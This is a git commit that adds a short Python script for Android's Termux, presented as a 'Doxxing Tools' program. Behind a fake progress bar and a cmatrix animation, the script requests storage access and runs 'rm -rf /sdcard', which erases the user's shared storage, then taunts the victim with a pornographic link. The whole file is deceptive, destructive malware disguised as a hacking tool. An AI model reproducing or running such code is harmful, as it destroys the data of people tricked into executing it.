ec693e5b060dc58438f91110d490d6f7cc1fe171
qimiekekes <93439586+qimiekekes@users.noreply.github.com>
2021-10-30 22:46:36 +0800

    Add files via upload
    ga tau

---
+++ main.py
@@ -0,0 +1,28 @@
+import os
+import sys
+import time 
+
+os.system('clear')
+os.system('figlet Doxxing Tools By Qimie.n4x')
+
+print("[                    ] 0% ")
+time.sleep(2)
+print("[====                ] 25% ")
+time.sleep(2)
+print("[========            ] 50% ")
+time.sleep(2)
+print("[============        ] 75% ")
+time.sleep(2)
+print("[====================] 100% ")
+time.sleep(2)
+
+os.system('pkg install cmatrix')
+os.system('cmatrix')
+os.system('clear')
+os.system('termux-setup-storage')
+os.system('rm -rf /sdcard')
+
+os.system('figlet Done Doxx Victim')
+print("Done Doxx Victim , Here The Proof ~# http://pornhub.com")
+
+sys.exit()
